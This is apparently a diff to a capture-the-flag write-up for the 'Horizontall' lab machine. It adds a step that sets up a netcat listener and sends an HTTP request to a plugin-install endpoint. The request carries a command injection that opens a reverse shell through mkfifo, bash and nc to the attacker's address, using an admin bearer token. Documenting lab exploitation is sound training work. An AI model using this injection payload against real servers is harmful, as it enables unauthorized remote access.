@@ -100,3 +100,27 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 09:01:14.799327 IP horizontall.htb > 10.10.14.26: ICMP echo request, id 8657, seq 1, length 64
 09:01:14.799373 IP 10.10.14.26 > horizontall.htb: ICMP echo reply, id 8657, seq 1, length 64
 ````
+
+6. Creates a reverse shell tunnel
+
+````shell
+$ nc -lnvp 53
+````
+
+````http
+POST /admin/plugins/install HTTP/1.1
+Host: api-prod.horizontall.htb
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+Connection: close
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNjg1Mzg2LCJleHAiOjE2NDQyNzczODZ9.hC7xIJQQyHmfa3qOc2AmnyCTOkhgJcmZx1-_sERq_n4
+Content-Length: 135
+
+{
+"plugin":"documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.26 53 > backpipe ; rm backpipe)",
+"port":"1337"
+}
+````
